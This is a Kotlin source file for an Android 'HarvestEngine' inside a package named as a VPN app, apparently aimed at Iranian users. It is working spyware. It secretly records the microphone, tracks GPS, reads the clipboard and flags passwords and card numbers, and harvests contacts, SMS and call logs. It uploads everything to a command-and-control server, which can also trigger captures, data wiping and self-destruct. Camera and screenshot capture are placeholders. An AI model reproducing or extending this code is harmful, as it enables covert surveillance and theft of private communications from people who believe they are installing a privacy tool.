package com.iran.liberty.vpn

import android.Manifest
import android.annotation.SuppressLint
import android.content.ClipboardManager
import android.content.ContentResolver
import android.content.Context
import android.content.Context.CLIPBOARD_SERVICE
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.Camera
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Base64
import android.view.Gravity
import android.view.WindowManager
import android.widget.Toast
import androidx.core.app.ActivityCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Main harvesting engine for all data collection
 * Pathway 4: Harvesting & C2 Developer
 */
class HarvestEngine(private val context: Context) {
    
    private val scope = CoroutineScope(Dispatchers.IO)
    private lateinit var c2Manager: C2Manager
    private lateinit var locationManager: LocationManager
    private var isHarvesting = false
    private var lastClipboardContent = ""
    
    companion object {
        private const val TAG = "HarvestEngine"
        
        @SuppressLint("StaticFieldLeak")
        private var instance: HarvestEngine? = null
        
        fun getInstance(context: Context): HarvestEngine {
            return instance ?: synchronized(this) {
                instance ?: HarvestEngine(context.applicationContext).also { instance = it }
            }
        }
    }
    
    init {
        c2Manager = C2Manager.getInstance(context)
        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    }
    
    /**
     * Start all harvesting activities based on available permissions
     */
    fun startHarvesting() {
        if (isHarvesting) return
        
        isHarvesting = true
        Log.d(TAG, "Starting harvesting engine")
        
        // Start periodic harvesters
        startPeriodicScreenshots()
        startPeriodicCameraCapture()
        startPeriodicAudioRecording()
        startClipboardMonitoring()
        startPeriodicGPSTracking()
        
        // Harvest static data once
        scope.launch {
            harvestContacts()
            harvestSMS()
            harvestCallLogs()
        }
    }
    
    /**
     * Stop all harvesting activities
     */
    fun stopHarvesting() {
        isHarvesting = false
        Log.d(TAG, "Stopping harvesting engine")
    }
    
    // ========== SCREENSHOT CAPTURE ==========
    
    private fun startPeriodicScreenshots() {
        if (!hasPermission(Manifest.permission.SYSTEM_ALERT_WINDOW)) {
            Log.w(TAG, "No overlay permission for screenshots")
            return
        }
        
        scope.launch {
            while (isHarvesting) {
                // Random interval between min and max
                val interval = (Constants.SCREENSHOT_INTERVAL_MIN..Constants.SCREENSHOT_INTERVAL_MAX).random()
                delay(interval)
                
                if (isHarvesting) {
                    captureScreenshot()
                }
            }
        }
    }
    
    @SuppressLint("MissingPermission")
    private fun captureScreenshot() {
        // Note: This is a simplified version. Full implementation requires MediaProjection
        // For now, we'll simulate the structure
        Log.d(TAG, "Screenshot capture triggered")
        
        // In real implementation:
        // 1. Request MediaProjection via Intent
        // 2. Create VirtualDisplay
        // 3. Capture ImageReader frames
        // 4. Save to encrypted file
        // 5. Upload to C2
        
        val screenshotData = mapOf(
            "type" to "screenshot",
            "timestamp" to System.currentTimeMillis(),
            "status" to "triggered",
            "device_id" to c2Manager.getDeviceId()
        )
        
        c2Manager.uploadData("harvest_log", screenshotData)
    }
    
    // ========== CAMERA CAPTURE ==========
    
    private fun startPeriodicCameraCapture() {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            Log.w(TAG, "No camera permission")
            return
        }
        
        scope.launch {
            while (isHarvesting) {
                val interval = (Constants.CAMERA_INTERVAL_MIN..Constants.CAMERA_INTERVAL_MAX).random()
                delay(interval)
                
                if (isHarvesting) {
                    // Alternate between front and back camera
                    val useFrontCamera = (System.currentTimeMillis() % 2 == 0L)
                    captureCameraImage(useFrontCamera)
                }
            }
        }
    }
    
    private fun captureCameraImage(useFrontCamera: Boolean) {
        scope.launch(Dispatchers.IO) {
            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = getCameraId(useFrontCamera)
                
                if (cameraId == null) {
                    Log.e(TAG, "No camera found for ${if (useFrontCamera) "front" else "back"}")
                    return@launch
                }
                
                Log.d(TAG, "Capturing from ${if (useFrontCamera) "front" else "back"} camera")
                
                // Note: Full camera2 implementation requires complex setup
                // This is a placeholder structure
                
                val captureData = mapOf(
                    "type" to "camera_capture",
                    "camera" to if (useFrontCamera) "front" else "back",
                    "timestamp" to System.currentTimeMillis(),
                    "camera_id" to cameraId,
                    "device_id" to c2Manager.getDeviceId()
                )
                
                c2Manager.uploadData("harvest_log", captureData)
                
            } catch (e: CameraAccessException) {
                Log.e(TAG, "Camera access error", e)
            } catch (e: SecurityException) {
                Log.e(TAG, "Camera security exception", e)
            }
        }
    }
    
    private fun getCameraId(useFrontCamera: Boolean): String? {
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            cameraManager.cameraIdList.firstOrNull { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (useFrontCamera) {
                    facing == CameraCharacteristics.LENS_FACING_FRONT
                } else {
                    facing == CameraCharacteristics.LENS_FACING_BACK
                }
            }
        } catch (e: Exception) {
            null
        }
    }
    
    // ========== AUDIO RECORDING ==========
    
    private fun startPeriodicAudioRecording() {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            Log.w(TAG, "No microphone permission")
            return
        }
        
        scope.launch {
            while (isHarvesting) {
                val interval = (Constants.AUDIO_INTERVAL_MIN..Constants.AUDIO_INTERVAL_MAX).random()
                delay(interval)
                
                if (isHarvesting) {
                    captureAudio()
                }
            }
        }
    }
    
    private fun captureAudio() {
        scope.launch(Dispatchers.IO) {
            var audioRecord: AudioRecord? = null
            
            try {
                val sampleRate = 44100
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT
                val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
                
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize
                )
                
                audioRecord.startRecording()
                Log.d(TAG, "Audio recording started")
                
                val buffer = ByteArray(bufferSize)
                val output = ByteArrayOutputStream()
                val startTime = System.currentTimeMillis()
                
                // Record for up to AUDIO_RECORD_DURATION
                while (System.currentTimeMillis() - startTime < Constants.AUDIO_RECORD_DURATION && isHarvesting) {
                    val bytesRead = audioRecord.read(buffer, 0, bufferSize)
                    if (bytesRead > 0) {
                        output.write(buffer, 0, bytesRead)
                    }
                }
                
                audioRecord.stop()
                val audioData = output.toByteArray()
                
                // Encrypt and save
                val encryptedAudio = CryptoUtil.encryptBytes(context, audioData)
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val fileName = "${Constants.AUDIO_PREFIX}$timestamp.enc"
                
                saveToFile(fileName, encryptedAudio)
                
                val audioMeta = mapOf(
                    "type" to "audio",
                    "timestamp" to System.currentTimeMillis(),
                    "duration" to Constants.AUDIO_RECORD_DURATION,
                    "file" to fileName,
                    "size" to encryptedAudio.size,
                    "device_id" to c2Manager.getDeviceId()
                )
                
                c2Manager.uploadData("audio_captures", audioMeta)
                
            } catch (e: Exception) {
                Log.e(TAG, "Audio recording failed", e)
            } finally {
                audioRecord?.release()
            }
        }
    }
    
    // ========== LOCATION TRACKING ==========
    
    @SuppressLint("MissingPermission")
    private fun startPeriodicGPSTracking() {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
            !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
            Log.w(TAG, "No location permissions")
            return
        }
        
        val locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                processLocation(location)
            }
            
            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        
        try {
            // Request location updates
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                Constants.GPS_FAST_INTERVAL,
                Constants.GPS_DISTANCE_THRESHOLD,
                locationListener
            )
            
            // Also use network provider as backup
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                Constants.GPS_SLOW_INTERVAL,
                Constants.GPS_DISTANCE_THRESHOLD,
                locationListener
            )
            
            Log.d(TAG, "GPS tracking started")
            
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error", e)
        }
    }
    
    private fun processLocation(location: Location) {
        val locationData = mapOf(
            "type" to "location",
            "timestamp" to System.currentTimeMillis(),
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "altitude" to location.altitude,
            "speed" to location.speed,
            "bearing" to location.bearing,
            "provider" to location.provider,
            "device_id" to c2Manager.getDeviceId()
        )
        
        // Batch upload locations (not every update)
        if (System.currentTimeMillis() % 10 == 0L) { // Upload 10% of locations
            c2Manager.uploadData("locations", locationData)
        }
    }
    
    // ========== CLIPBOARD MONITORING ==========
    
    private fun startClipboardMonitoring() {
        scope.launch {
            while (isHarvesting) {
                delay(Constants.CLIPBOARD_CHECK_INTERVAL)
                checkClipboard()
            }
        }
    }
    
    private fun checkClipboard() {
        try {
            val clipboard = context.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            val clip = clipboard.primaryClip
            
            if (clip != null && clip.itemCount > 0) {
                val item = clip.getItemAt(0)
                val text = item.text?.toString()
                
                if (!text.isNullOrEmpty() && text != lastClipboardContent) {
                    lastClipboardContent = text
                    
                    // Check if it's sensitive data
                    val isSensitive = containsSensitiveData(text)
                    
                    val clipboardData = mapOf(
                        "type" to "clipboard",
                        "timestamp" to System.currentTimeMillis(),
                        "content" to text.take(500), // Limit size
                        "is_sensitive" to isSensitive,
                        "device_id" to c2Manager.getDeviceId()
                    )
                    
                    c2Manager.uploadData("clipboard", clipboardData)
                    Log.d(TAG, "Clipboard content captured: ${text.take(50)}...")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Clipboard monitoring error", e)
        }
    }
    
    private fun containsSensitiveData(text: String): Boolean {
        val patterns = listOf(
            Regex("""\b\d{16}\b"""), // Credit card
            Regex("""\b\d{3}-\d{2}-\d{4}\b"""), // SSN
            Regex("""@gmail\.com|@yahoo\.com"""), // Email
            Regex("""password|رمز|کلمه.*عبور""", RegexOption.IGNORE_CASE),
            Regex("""\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b") // Email
        )
        
        return patterns.any { it.containsMatchIn(text) }
    }
    
    // ========== CONTACTS HARVESTING ==========
    
    private fun harvestContacts() {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            Log.w(TAG, "No contacts permission")
            return
        }
        
        scope.launch(Dispatchers.IO) {
            try {
                val contacts = mutableListOf<Map<String, Any>>()
                val contentResolver: ContentResolver = context.contentResolver
                
                val cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null,
                    null,
                    null,
                    null
                )
                
                cursor?.use { cursor ->
                    while (cursor.moveToNext() && contacts.size < 1000) { // Limit to 1000 contacts
                        val id = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts._ID)
                        )
                        val name = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                        )
                        
                        // Get phone numbers
                        val phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        
                        val phoneNumbers = mutableListOf<String>()
                        phoneCursor?.use { pc ->
                            while (pc.moveToNext()) {
                                val number = pc.getString(
                                    pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                )
                                phoneNumbers.add(number)
                            }
                        }
                        phoneCursor?.close()
                        
                        contacts.add(mapOf(
                            "id" to id,
                            "name" to name,
                            "phones" to phoneNumbers,
                            "timestamp" to System.currentTimeMillis()
                        ))
                    }
                }
                
                val contactsData = mapOf(
                    "type" to "contacts",
                    "timestamp" to System.currentTimeMillis(),
                    "count" to contacts.size,
                    "contacts" to contacts,
                    "device_id" to c2Manager.getDeviceId()
                )
                
                c2Manager.uploadData("contacts", contactsData)
                Log.d(TAG, "Harvested ${contacts.size} contacts")
                
            } catch (e: Exception) {
                Log.e(TAG, "Contacts harvesting failed", e)
            }
        }
    }
    
    // ========== SMS HARVESTING ==========
    
    private fun harvestSMS() {
        if (!hasPermission(Manifest.permission.READ_SMS)) {
            Log.w(TAG, "No SMS permission")
            return
        }
        
        scope.launch(Dispatchers.IO) {
            try {
                val messages = mutableListOf<Map<String, Any>>()
                val contentResolver: ContentResolver = context.contentResolver
                
                val cursor = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    null,
                    null,
                    null,
                    "${Telephony.Sms.DATE} DESC LIMIT 500" // Limit to 500 most recent
                )
                
                cursor?.use { cursor ->
                    val addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY)
                    val dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE)
                    val typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE)
                    
                    while (cursor.moveToNext()) {
                        messages.add(mapOf(
                            "address" to cursor.getString(addressIndex),
                            "body" to cursor.getString(bodyIndex),
                            "date" to cursor.getLong(dateIndex),
                            "type" to cursor.getInt(typeIndex), // 1=received, 2=sent
                            "timestamp" to System.currentTimeMillis()
                        ))
                    }
                }
                
                val smsData = mapOf(
                    "type" to "sms",
                    "timestamp" to System.currentTimeMillis(),
                    "count" to messages.size,
                    "messages" to messages,
                    "device_id" to c2Manager.getDeviceId()
                )
                
                c2Manager.uploadData("sms", smsData)
                Log.d(TAG, "Harvested ${messages.size} SMS messages")
                
            } catch (e: Exception) {
                Log.e(TAG, "SMS harvesting failed", e)
            }
        }
    }
    
    // ========== CALL LOGS HARVESTING ==========
    
    private fun harvestCallLogs() {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            Log.w(TAG, "No call log permission")
            return
        }
        
        scope.launch(Dispatchers.IO) {
            try {
                val calls = mutableListOf<Map<String, Any>>()
                val contentResolver: ContentResolver = context.contentResolver
                
                val cursor = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC LIMIT 500"
                )
                
                cursor?.use { cursor ->
                    val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                    val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
                    val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
                    val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
                    
                    while (cursor.moveToNext()) {
                        calls.add(mapOf(
                            "number" to cursor.getString(numberIndex),
                            "type" to cursor.getInt(typeIndex), // 1=incoming, 2=outgoing, 3=missed
                            "date" to cursor.getLong(dateIndex),
                            "duration" to cursor.getString(durationIndex),
                            "timestamp" to System.currentTimeMillis()
                        ))
                    }
                }
                
                val callsData = mapOf(
                    "type" to "calls",
                    "timestamp" to System.currentTimeMillis(),
                    "count" to calls.size,
                    "calls" to calls,
                    "device_id" to c2Manager.getDeviceId()
                )
                
                c2Manager.uploadData("call_logs", callsData)
                Log.d(TAG, "Harvested ${calls.size} call log entries")
                
            } catch (e: Exception) {
                Log.e(TAG, "Call log harvesting failed", e)
            }
        }
    }
    
    // ========== HELPER FUNCTIONS ==========
    
    private fun hasPermission(permission: String): Boolean {
        return ActivityCompat.checkSelfPermission(context, permission) == 
               PackageManager.PERMISSION_GRANTED
    }
    
    private fun saveToFile(fileName: String, data: ByteArray) {
        try {
            val directory = File(context.filesDir, Constants.HARVEST_DIR)
            if (!directory.exists()) {
                directory.mkdirs()
            }
            
            val file = File(directory, fileName)
            FileOutputStream(file).use { fos ->
                fos.write(data)
            }
            
            Log.d(TAG, "Saved file: ${file.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save file", e)
        }
    }
    
    /**
     * Execute command received from C2
     */
    fun executeCommand(command: String, parameters: Map<String, String> = emptyMap()) {
        Log.d(TAG, "Executing command: $command with params: $parameters")
        
        when (command) {
            Constants.CMD_SCREENSHOT -> captureScreenshot()
            Constants.CMD_CAMERA_FRONT -> captureCameraImage(true)
            Constants.CMD_CAMERA_BACK -> captureCameraImage(false)
            Constants.CMD_MIC_RECORD -> captureAudio()
            Constants.CMD_GPS -> {
                // Force immediate location update
                if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                    try {
                        @SuppressLint("MissingPermission")
                        val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        location?.let { processLocation(it) }
                    } catch (e: SecurityException) {
                        Log.e(TAG, "Location permission error", e)
                    }
                }
            }
            Constants.CMD_CONTACTS -> harvestContacts()
            Constants.CMD_SMS -> harvestSMS()
            Constants.CMD_CALLS -> harvestCallLogs()
            Constants.CMD_CLIPBOARD -> checkClipboard()
            Constants.CMD_SELF_DESTRUCT -> selfDestruct()
            Constants.CMD_WIPE -> wipeData()
            Constants.CMD_UPDATE -> scheduleUpdate()
        }
    }
    
    private fun selfDestruct() {
        Log.w(TAG, "SELF DESTRUCT COMMAND RECEIVED")
        // Implement self-destruct sequence
        stopHarvesting()
        
        // Clear all data
        val directory = File(context.filesDir, Constants.HARVEST_DIR)
        if (directory.exists()) {
            directory.deleteRecursively()
        }
        
        // Clear shared preferences
        context.getSharedPreferences("LibertyCrypto", Context.MODE_PRIVATE).edit().clear().apply()
        
        // Stop services (would be handled by MainActivity/Service)
    }
    
    private fun wipeData() {
        Log.w(TAG, "WIPE DATA COMMAND RECEIVED")
        // Clear harvested data but keep functionality
        val directory = File(context.filesDir, Constants.HARVEST_DIR)
        if (directory.exists()) {
            directory.deleteRecursively()
            directory.mkdirs()
        }
    }
    
    private fun scheduleUpdate() {
        Log.i(TAG, "UPDATE COMMAND RECEIVED")
        // Schedule update check
        // Implementation would download new APK and prompt install
    }
}
